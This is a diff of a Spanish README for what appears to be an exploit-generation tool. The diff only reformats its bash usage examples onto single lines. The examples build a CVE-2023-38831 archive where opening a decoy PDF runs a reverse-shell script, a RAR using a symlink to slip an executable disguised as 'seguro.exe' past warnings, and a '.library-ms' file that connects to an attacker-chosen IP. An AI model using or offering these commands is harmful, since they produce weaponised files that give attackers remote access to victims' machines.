@@ -42,10 +42,7 @@ Exploit que manipula un archivo `.zip` para que al abrir un archivo señuelo, se
 ### 🧪 Ejemplo:
 
 ```bash
-python main.py cve-2023-38831 \
-  --bait documento.pdf \
-  --switch reverse_shell.cmd \
-  --output exploit_38831.rar
+python main.py cve-2023-38831   --bait documento.pdf   --switch reverse_shell.cmd   --output exploit_38831.rar
 ```
 
 ---
@@ -58,11 +55,7 @@ Crea un archivo `.rar` con un symlink y un ejecutable que evaden la advertencia 
 ### 🧪 Ejemplo:
 
 ```bash
-python main.py cve-dual \
-  --payload payload.exe \
-  --alt-name "seguro.exe" \
-  --symlink-name "runme.exe" \
-  --output exploit_dual.rar
+python main.py cve-dual   --payload payload.exe   --alt-name "seguro.exe"   --symlink-name "runme.exe"   --output exploit_dual.rar
 ```
 
 ---
@@ -75,11 +68,7 @@ Crea un archivo `.library-ms` (y opcionalmente `.scf`) que se conecta a un servi
 ### 🧪 Ejemplo básico:
 
 ```bash
-python main.py library \
-  --file-name documentos \
-  --ip 192.168.1.100 \
-  --type basic \
-  --output library_exploit.zip
+python main.py library   --file-name documentos   --ip 192.168.1.100   --type basic   --output library_exploit.zip
 ```
 
 ### Tipos soportados:
